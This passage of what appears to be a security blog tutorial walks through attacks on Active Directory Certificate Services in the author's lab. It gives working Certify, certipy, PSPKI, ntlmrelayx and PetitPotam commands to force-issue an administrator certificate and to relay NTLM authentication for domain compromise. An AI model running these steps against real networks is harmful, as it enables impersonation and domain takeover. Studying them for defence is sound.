      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span>\<span class="n">Administrators</span>        <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>

      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>

      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Authenticated</span> <span class="n">UsersS</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span>\<span class="n">Administrators</span>        <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">Enroll</span>                           <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>             <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">1103</span>
    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="kc">None</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">No</span> <span class="n">Vulnerable</span> <span class="n">Certificates</span> <span class="n">Templates</span> <span class="n">found</span><span class="err">!</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">12.1846555</span>
</pre></div>
<p>As seen in the output, <code>elswix</code> has <strong>ManageCA</strong> privileges on <code>elswixcorp-DC02-CA</code>. Since we have his credentials, we can leverage these privileges.</p><br/>
<p>Let’s request a certificate using the <strong>SubCA</strong> template, providing an arbitrary <strong>SAN</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">request</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">dc02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="n">SubCA</span> <span class="o">/</span><span class="n">altname</span><span class="p">:</span><span class="n">administrator</span>


   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">subject</span> <span class="n">name</span> <span class="n">specified</span><span class="p">,</span> <span class="n">using</span> <span class="n">current</span> <span class="n">context</span> <span class="k">as</span> <span class="n">subject</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">SubCA</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AltName</span>                 <span class="p">:</span> <span class="n">administrator</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">dc02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">submission</span> <span class="n">failed</span><span class="p">:</span> <span class="n">Denied</span> <span class="n">by</span> <span class="n">Policy</span> <span class="n">Module</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Last</span> <span class="n">status</span>             <span class="p">:</span> <span class="mh">0x80094012</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">23</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEowIBAAKCAQEAutesd65NxZkzjWrYDx9ttRf</span><span class="o">+</span><span class="n">VYBlGGd</span><span class="o">+</span><span class="n">ZY4GrA22zcByFZEM</span>
<span class="n">yCkGCviiXPOMbNmlTR5ATWwcm6GvpdFZzpT0T</span><span class="o">/</span><span class="n">v7OSUIg25PxrLYx9YpRV</span><span class="o">+</span><span class="mi">0</span><span class="n">uNKT</span>
<span class="n">FF</span><span class="o">/</span><span class="n">Pqmm5c5tk5dm</span><span class="o">+</span><span class="n">h0dXDF9tF4XydNGOMJ9Ysx3C8RCeLHLz14B2RvnPvf4EMaWf</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">klrlJ2LBxVYmGMYIHdokkRMxV8gy</span><span class="o">/</span><span class="mi">1</span><span class="n">Te</span><span class="o">/</span><span class="n">baVSW8WTD7rA6G1wK5vLUhng9nSxl3v</span>
<span class="n">vnatfwKBgGWQz68WnfFCkWwDnj8Yi4N</span><span class="o">+</span><span class="mi">6</span><span class="n">SDfIpQoZyMGXEI96KXmc4HfHtE8T</span><span class="o">+</span><span class="n">Ej</span>
<span class="o">/</span><span class="n">vUrjKOjmt1SqdhzYG</span><span class="o">+</span><span class="n">C9kwpTiye8sTgUpLPOGz8iTLzBgIAqXcaw7VZHGlOKqUH</span>
<span class="mi">1</span><span class="n">JDJ7dv9</span><span class="o">/</span><span class="n">bunSwS4iuHcvOzZmaGs9IEOdgWqjnGugwPBl9DdLTqa</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>

<span class="p">[</span><span class="n">X</span><span class="p">]</span> <span class="n">Error</span> <span class="n">downloading</span> <span class="n">certificate</span><span class="p">:</span> <span class="n">Cert</span> <span class="ow">not</span> <span class="n">yet</span> <span class="n">issued</span> <span class="n">yet</span><span class="err">!</span> <span class="p">(</span><span class="n">iDisposition</span><span class="p">:</span> <span class="mi">2</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">04.1087894</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>As expected, the request failed. However, <code>Certify</code> returned the <strong>request ID</strong>, in this case, <code>23</code>, which is crucial for the next step (forcing approval). <strong>You must also save the returned private key</strong>, as it will be needed later.</p><br/>
<p>Before approving the request, let’s grant ourselves the <code>ManageCertificates</code> privilege. For this, I’ll use <code>certipy</code> from Linux, as it’s more convenient:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">ca</span> <span class="o">-</span><span class="n">add</span><span class="o">-</span><span class="n">officer</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC02-CA'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="err">!</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">officer</span> <span class="s1">'elswix'</span> <span class="n">on</span> <span class="s1">'elswixcorp-DC02-CA'</span>
</pre></div>
<p>Great! We’ve successfully added ourselves as an officer on <code>elswixcorp-DC02-CA</code>.</p><br/>
<p>Now, leveraging these privileges, we can <strong>force the request approval</strong>. This can be done using the <a href="https://github.com/PKISolutions/PSPKI">PSPKI</a> module:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">.</span>\<span class="n">PSPKI</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">CertificationAuthority</span> <span class="o">-</span><span class="n">Name</span> <span class="s2">"elswixcorp-DC02-CA"</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">FailedRequest</span> <span class="o">-</span><span class="n">RequestID</span> <span class="mi">23</span> <span class="o">|</span> <span class="n">Approve</span><span class="o">-</span><span class="n">CertificateRequest</span>

<span class="n">HResult</span>      <span class="n">StatusMessage</span>
<span class="o">-------</span>      <span class="o">-------------</span>
<span class="mi">0</span>            <span class="n">The</span> <span class="n">certificate</span> <span class="s1">'23'</span> <span class="n">was</span> <span class="n">issued</span><span class="o">.</span>


<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>Finally, let’s retrieve the issued certificate using <code>Certify.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">download</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span> <span class="o">/</span><span class="nb">id</span><span class="p">:</span><span class="mi">23</span>

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Download</span> <span class="n">a</span> <span class="n">Certificates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificates</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">23</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIFfjCCBGagAwIBAgITPgAAABdAr4ClGpSkAAAAAAAAFzANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="n">aXhjb3JwMRswGQYDVQQDExJlbHN3aXhjb3JwLURDMDItQ0EwHhcNMjUwNDA1MTc0</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="mi">2</span><span class="n">wTclONSYBY8YvNGzyx6TbrSMkLdyyA1BGRh</span><span class="o">/</span><span class="n">Pk5Zj0UMhSyMz4ybzIg6OsrgJ</span><span class="o">/+</span>
<span class="n">VxmUQiRSywwk01cOfdx0yr7mc3PGYMzIBxFYR</span><span class="o">/</span><span class="n">lOz0DL10axDnhxPRTLOsi</span><span class="o">+</span><span class="n">ZJEB</span>
<span class="n">C9</span><span class="o">+</span><span class="n">li9fhn745c2sOmX2LbOPq</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">00.2893389</span>
</pre></div>
<p>Now, copy this certificate to a file, along with the private key we previously saved:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIFfjCCBGagAwIBAgITPgAAABdAr4ClGpSkAAAAAAAAFzANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="n">aXhjb3JwMRswGQYDVQQDExJlbHN3aXhjb3JwLURDMDItQ0EwHhcNMjUwNDA1MTc0</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="mi">2</span><span class="n">wTclONSYBY8YvNGzyx6TbrSMkLdyyA1BGRh</span><span class="o">/</span><span class="n">Pk5Zj0UMhSyMz4ybzIg6OsrgJ</span><span class="o">/+</span>
<span class="n">VxmUQiRSywwk01cOfdx0yr7mc3PGYMzIBxFYR</span><span class="o">/</span><span class="n">lOz0DL10axDnhxPRTLOsi</span><span class="o">+</span><span class="n">ZJEB</span>
<span class="n">C9</span><span class="o">+</span><span class="n">li9fhn745c2sOmX2LbOPq</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEowIBAAKCAQEAutesd65NxZkzjWrYDx9ttRf</span><span class="o">+</span><span class="n">VYBlGGd</span><span class="o">+</span><span class="n">ZY4GrA22zcByFZEM</span>
<span class="n">yCkGCviiXPOMbNmlTR5ATWwcm6GvpdFZzpT0T</span><span class="o">/</span><span class="n">v7OSUIg25PxrLYx9YpRV</span><span class="o">+</span><span class="mi">0</span><span class="n">uNKT</span>
<span class="n">FF</span><span class="o">/</span><span class="n">Pqmm5c5tk5dm</span><span class="o">+</span><span class="n">h0dXDF9tF4XydNGOMJ9Ysx3C8RCeLHLz14B2RvnPvf4EMaWf</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">klrlJ2LBxVYmGMYIHdokkRMxV8gy</span><span class="o">/</span><span class="mi">1</span><span class="n">Te</span><span class="o">/</span><span class="n">baVSW8WTD7rA6G1wK5vLUhng9nSxl3v</span>
<span class="n">vnatfwKBgGWQz68WnfFCkWwDnj8Yi4N</span><span class="o">+</span><span class="mi">6</span><span class="n">SDfIpQoZyMGXEI96KXmc4HfHtE8T</span><span class="o">+</span><span class="n">Ej</span>
<span class="o">/</span><span class="n">vUrjKOjmt1SqdhzYG</span><span class="o">+</span><span class="n">C9kwpTiye8sTgUpLPOGz8iTLzBgIAqXcaw7VZHGlOKqUH</span>
<span class="mi">1</span><span class="n">JDJ7dv9</span><span class="o">/</span><span class="n">bunSwS4iuHcvOzZmaGs9IEOdgWqjnGugwPBl9DdLTqa</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
</pre></div>
<p>Then, use <code>openssl</code> to convert it into a <code>.pfx</code> file and use it for authentication. This process is always the same.</p><br/>
<h3>NTLM Relay to AD CS HTTP Endpoints (ESC8)</h3><br/>
<p>This technique abuses NTLM relay attacks against vulnerable <strong>AD CS HTTP-based enrollment endpoints</strong>, such as the classic <strong><code>certsrv</code></strong> web interface. These endpoints are exposed when roles like <strong>Certificate Authority Web Enrollment</strong>, <strong>Certificate Enrollment Web Service (CES/CEP)</strong>, or <strong>Network Device Enrollment Service (NDES)</strong> are installed.</p><br/>
<p>If these endpoints are not protected with <strong>Extended Protection for Authentication (EPA)</strong>, an attacker can relay NTLM authentication requests (e.g., from coercion attacks like <strong>PetitPotam</strong>) to one of these interfaces and request a certificate on behalf of the victim — typically a domain controller or any privileged machine account.</p><br/>
<p>Once the attacker obtains a certificate — usually via templates like <strong>Machine</strong> or <strong>User</strong> that allow <strong>Client Authentication</strong> — it can be used to impersonate the victim and potentially compromise the domain. If the victim is a domain controller, this can lead to full domain compromise.</p><br/>
<p>This attack doesn’t exploit certificate templates directly, but instead targets the web enrollment mechanisms of AD CS — which are often overlooked and misconfigured. Despite mitigations in newer Windows versions, many environments still run vulnerable systems, especially with <strong>Server 2016</strong>.</p><br/>
<p>To demonstrate this vulnerability, I installed the <strong>Certificate Authority Web Enrollment</strong> role on <code>DC02</code>.</p><br/>
<h3>Demonstration</h3><br/>
<p>In the first demonstration, we’ll coerce an NTLM authentication from <code>Workstation01</code> and relay it to the AD CS HTTP endpoint on <code>DC02</code> using <code>ntlmrelayx.py</code>. This should return a certificate for the <code>Workstation01$</code> computer account, which we can then use to authenticate as that machine — effectively compromising it.</p><br/>
<p>First, I’ll set up the <code>ntlmrelayx</code> listener. You must specify the destination server where the authentication will be relayed, as well as the type of attack to perform. In this case, we’ll perform an AD CS relay attack, so the <code>target</code> must point to the vulnerable HTTP enrollment endpoint:</p><br/>
<div class="highlight"><pre><span></span><span class="root1">root@ubuntu$</span> <span class="n">ntlmrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span><span class="o">/</span><span class="n">certsrv</span><span class="o">/</span><span class="n">certfnsh</span><span class="o">.</span><span class="n">asp</span> <span class="o">--</span><span class="n">adcs</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">http</span><span class="o">-</span><span class="n">server</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">DCSYNC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMB</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">RPC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">MSSQL</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="ow">in</span> <span class="n">relay</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">single</span> <span class="n">host</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">SMB</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">445</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">WCF</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9389</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">RAW</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">6666</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Multirelay</span> <span class="n">disabled</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
</pre></div>
<p>Next, I’ll coerce the <strong>NTLM authentication</strong> using <a href="https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py">PetitPotam</a>. In the past, this coercion could be triggered without valid credentials, but that behavior was patched in newer versions of Windows Server. Therefore, in this case, I’ll provide the credentials of a regular domain user (it doesn’t need to be privileged).</p><br/>
<p>Specify the listener IP (our attacker's host) and the target IP (<code>Workstation01</code> in this case):</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">PetitPotam</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168.100.1</span> <span class="mf">192.168.100.4</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="err">!</span>


              <span class="n">___</span>            <span class="n">_</span>        <span class="n">_</span>      <span class="n">_</span>        <span class="n">___</span>            <span class="n">_</span>                     
             <span class="o">|</span> <span class="n">_</span> \   <span class="n">___</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>     <span class="o">|</span> <span class="n">_</span> \   <span class="n">___</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>    <span class="n">__</span> <span class="n">_</span>    <span class="n">_</span> <span class="n">__</span>   
             <span class="o">|</span>  <span class="n">_</span><span class="o">/</span>  <span class="o">/</span> <span class="o">-</span><span class="n">_</span><span class="p">)</span>   <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>    <span class="o">|</span> <span class="o">|</span>    <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>    <span class="o">|</span>  <span class="n">_</span><span class="o">/</span>  <span class="o">/</span> <span class="n">_</span> \   <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>  <span class="o">/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span>  <span class="o">|</span> <span class="s1">'  \  </span>
